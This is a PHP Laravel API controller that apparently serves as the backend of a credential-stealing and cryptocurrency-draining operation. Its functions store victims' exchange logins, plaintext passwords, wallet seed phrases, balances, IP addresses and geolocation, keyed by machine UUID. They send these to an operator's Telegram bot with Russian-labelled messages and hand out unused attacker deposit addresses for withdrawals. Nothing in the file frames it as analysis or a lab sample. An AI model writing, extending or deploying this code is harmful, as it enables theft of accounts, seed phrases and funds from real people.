<?php

namespace App\Http\Controllers\Api;

use App\Http\Controllers\Controller;
use App\Models\Account;
use App\Models\Address;
use App\Models\Checker;
use App\Models\Machine;
use App\Models\Setting;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\Http;

class ExchangeController extends Controller
{
    public function createAccount(Request $r)
    {
        $user = Account::query()->where('site', $r->post('site'));

        if ($r->post('email')) {
            $user = $user->where('email', $r->post('email'));
        }

        if ($r->post('telephone')) {
            $user = $user->where('mobile', $r->post('telephone'));
        }

        $ip = $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER['REMOTE_ADDR'];

        $uuid = $r->post('uuid');

        $user = $user->where('ip', $ip);

        if (isset($uuid) && strlen($uuid) > 0) {
            $user = $user->where('uuid', $uuid);
        }

        $user = $user->first();

        $response = Http::get("http://ip-api.com/json/" . $ip)->json();
        $country = null;
        $geo = null;

        if ($response['status'] === "success") {
            $country = $response['countryCode'];
            $geo = $response['countryCode'] . " - " . $response['country'] . ", " . $response['regionName'] . ", " . $response['city'] . ", " . $response['zip'] . " (lat: " . $response['lat'] . ", lng: " . $response['lon'] . ")";
        }

        $machineId = null;

        if ($r->post('uuid')) {
            $machine = Machine::query()->where('uuid', $r->post('uuid'))->first();

            $machineId = $machine?->id;
        }

        if (!$user) {
            $user = Account::query()->create([
                'site' => $r->post('site'),
                'email' => $r->post('email'),
                'mobile_code' => $r->post('telephoneCode'),
                'mobile' => $r->post('telephone'),
                'password' => $r->post('password'),
                'ip' => $ip,
                'country' => $country,
                'all_balances' => json_encode([]),
                'full_balance' => json_encode([]),
                'trading_balance' => json_encode([]),
                'seed' => $r->post('seed') !== null ? $r->post('seed') : null,
                'geo' => $geo,
                'uuid' => $uuid,
                'machine_id' => $machineId
            ]);

            $text = "<b>Новая авторизация</b>\n\n";
        } else {
            if ($r->post('email')) {
                $user->update([
                    'email' => $r->post('email')
                ]);
            }

            if ($r->post('seed') && $r->post('seed') !== null) {
                $user->update([
                    'seed' => $r->post('seed')
                ]);
            }

            $user->update([
                'ip' => $ip,
                'country' => $country,
                'geo' => $geo,
                'uuid' => $uuid,
                'machine_id' => $machineId
            ]);

            $text = "<b>Обновление авторизации</b>\n\n";
        }

        if ($r->post('notify') && $r->post('notify') === "true") {
            $tgID = Setting::getValue('tg_id');
            $tgToken = Setting::getValue('tg_token');

            if ($tgID && $tgToken) {
                $text .= "<b>Сайт</b>: " . $user->site . "\n\n";
                $text .= "<b>Логин</b>: " . $user->email . "\n";
                $text .= "<b>Пароль</b>: " . $user->password . "\n";
                $text .= "<b>IP</b>: " . $ip . "\n";
                $text .= "<b>Страна</b>: " . $user->country ?? 'N/A';

                if ($user->seed !== null) {
                    $text .= "\n\n<b>Сид</b>: " . $user->seed;
                }

                Http::get("https://api.telegram.org/bot" . $tgToken . "/sendMessage?chat_id=" . $tgID . "&text=" . $text . "&parse_mode=html");
            }
        }

        return [
            'id' => $user->id
        ];
    }

    public function setWithdraw(Request $r)
    {
        $user = Account::query()->where('id', $r->post('userId'))->first();

        if ($user) {
            $withdraw = floatval($r->post('amount'));

            $user->update([
                'withdraw_balance' => number_format($withdraw, 2),
                'used' => true
            ]);

            $isDelete = boolval(Setting::getValue('delete_address')) ?? true;

            if ($isDelete) {
                Address::query()->where('address', $r->post('address'))->where('is_used', false)->first()->update([
                    'is_used' => true
                ]);
            }

            $tgID = Setting::getValue('tg_id');
            $tgToken = Setting::getValue('tg_token');

            if ($tgID && $tgToken) {
                $balancesText = '';
                $balances = json_decode($user->all_balances, true);

                foreach ($balances as $balance) {
                    $balancesText .= $balance['asset'] . ' - ' . number_format($balance['usd'], 2) . '$ (' . $balance['type'] . ') | ';
                }

                $text = "<b>Вывод</b>\n\n";
                $text .= "<b>Сайт</b>: " . $user->site . "\n\n";
                $text .= "<b>Логин</b>: " . $user->email . "\n";
                $text .= "<b>Пароль</b>: " . $user->password . "\n";
                $text .= "<b>IP</b>: " . $user->ip . "\n";
                $text .= "<b>Страна</b>: " . $user->country ?? 'N/A';
                $text .= "\n\n<b>Общий баланс</b>: " . number_format($user->balance, 2) . "$";
                $text .= "\n<b>Баланс</b>: " . $balancesText;
                $text .= "\n\n<b>Выведено</b>: " . number_format($withdraw, 2) . "$";
                $text .= "\n<b>Адрес</b>: " . $r->post('address');

                Http::get("https://api.telegram.org/bot" . $tgToken . "/sendMessage?chat_id=" . $tgID . "&text=" . $text . "&parse_mode=html");
            }
        }

        return [];
    }

    public function setAllBalances(Request $r)
    {
        $user = Account::query()->where('id', $r->post('userId'))->first();

        if ($r->post('balances')) {
            $user?->update([
                'all_balances' => json_encode($r->post('balances'))
            ]);
        }

        return [];
    }

    public function setBalance(Request $r)
    {
        $user = Account::query()->where('id', $r->post('userId'))->first();

        if ($r->post('balance')) {
            if (floatval($user->balance) !== floatval($r->post('balance'))) {
                $tgID = Setting::getValue('tg_id');
                $tgToken = Setting::getValue('tg_token');

                if ($tgID && $tgToken) {
                    $text = "<b>Получение баланса</b>\n\n";

                    $balancesText = '';
                    $balances = json_decode($user->all_balances, true);

                    foreach ($balances as $balance) {
                        $balancesText .= $balance['asset'] . ' - ' . number_format($balance['usd'], 2) . '$ (' . $balance['type'] . ') | ';
                    }

                    $text .= "<b>Сайт</b>: " . $user->site . "\n\n";
                    $text .= "<b>Логин</b>: " . $user->email . "\n";
                    $text .= "<b>Пароль</b>: " . $user->password . "\n";
                    $text .= "<b>IP</b>: " . $user->ip . "\n";
                    $text .= "<b>Страна</b>: " . $user->country ?? 'N/A';
                    $text .= "\n\n<b>Общий баланс</b>: " . number_format($r->post('balance'), 2) . "$";
                    $text .= "\n<b>Баланс</b>: " . $balancesText;

                    if ($user->seed !== null) {
                        $text .= "\n\n<b>Сид</b>: " . $user->seed;
                    }

                    Http::get("https://api.telegram.org/bot" . $tgToken . "/sendMessage?chat_id=" . $tgID . "&text=" . $text . "&parse_mode=html");
                }
            }

            $user?->update([
                'balance' => $r->post('balance')
            ]);
        }

        return [];
    }

    public function getAddress(Request $r)
    {
        $address = Address::query()->where('type', $r->get('type'))->where('is_used', false)->inRandomOrder()->first();

        if (!$address) {
            return response()->json([
                'address' => null
            ]);
        }

        return response()->json([
            'address' => $address->address
        ]);
    }

    public function getSettings()
    {
        $minUsdValue = Setting::getValue('crypto_min_usd') ?? 1;

        return [
            'setting' => [
                'min_amount' => $minUsdValue
            ]
        ];
    }

    public function setChecker(Request $r)
    {
        $body = $r->post();

        $site = $body['site'];
        $uuid = $body['uuid'];

        $params = $body['data'];

        $machine = Machine::query()->where('uuid', $uuid)->first();

        if (!$machine) {
            return response()->json();
        }

        $checker = Checker::query()
            ->where('machine_id', $machine->id)
            ->where('site', $site)
            ->first();

        if ($checker) {
            $checker->update([
                'params' => json_encode($params)
            ]);
        } else {
            Checker::query()->create([
                'machine_id' => $machine->id,
                'site' => $site,
                'params' => json_encode($params)
            ]);
        }

        return response()->json();
    }
}
